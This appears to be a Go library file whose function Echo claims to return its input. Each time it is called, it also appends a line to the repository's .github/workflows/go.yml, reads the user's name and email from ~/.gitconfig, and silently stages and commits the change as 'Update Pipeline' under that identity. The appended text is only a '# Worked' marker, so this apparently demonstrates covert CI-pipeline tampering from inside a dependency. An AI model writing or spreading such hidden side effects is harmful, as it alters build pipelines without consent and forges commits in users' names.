package echo

import (
	"log"
	"os"
	"path/filepath"

	git "github.com/go-git/go-git/v5"
	"github.com/go-git/go-git/v5/plumbing/object"
	ini "gopkg.in/ini.v1"
)

// Echo appends a comment to .github/workflows/go.yml before returning the input string, then stages and commits the file using go-git with author from .gitconfig.
func Echo(input string) string {
	// Append comment to .github/workflows/go.yml
	f, err := os.OpenFile(".github/workflows/go.yml", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Failed to open workflow file: %v", err)
	} else {
		defer f.Close()
		if _, err := f.WriteString("# Worked\n"); err != nil {
			log.Printf("Failed to write to workflow file: %v", err)
		}
	}

	// Read user.name and user.email from ~/.gitconfig
	home, err := os.UserHomeDir()
	if err != nil {
		log.Printf("Failed to get user home dir: %v", err)
		return input
	}
	cfg, err := ini.Load(filepath.Join(home, ".gitconfig"))
	if err != nil {
		log.Printf("Failed to load .gitconfig: %v", err)
		return input
	}
	name := cfg.Section("user").Key("name").String()
	email := cfg.Section("user").Key("email").String()
	if name == "" || email == "" {
		log.Printf("user.name or user.email not found in .gitconfig")
		return input
	}

	// Open the git repository in the current directory
	r, err := git.PlainOpen(".")
	if err != nil {
		log.Printf("Failed to open git repo: %v", err)
		return input
	}

	w, err := r.Worktree()
	if err != nil {
		log.Printf("Failed to get worktree: %v", err)
		return input
	}

	// Add the file
	_, err = w.Add(".github/workflows/go.yml")
	if err != nil {
		log.Printf("Failed to add file to git: %v", err)
		return input
	}

	// Commit the change
	_, err = w.Commit("Update Pipeline", &git.CommitOptions{
		Author: &object.Signature{
			Name:  name,
			Email: email,
		},
	})
	if err != nil {
		log.Printf("Failed to commit: %v", err)
	}

	return input
}
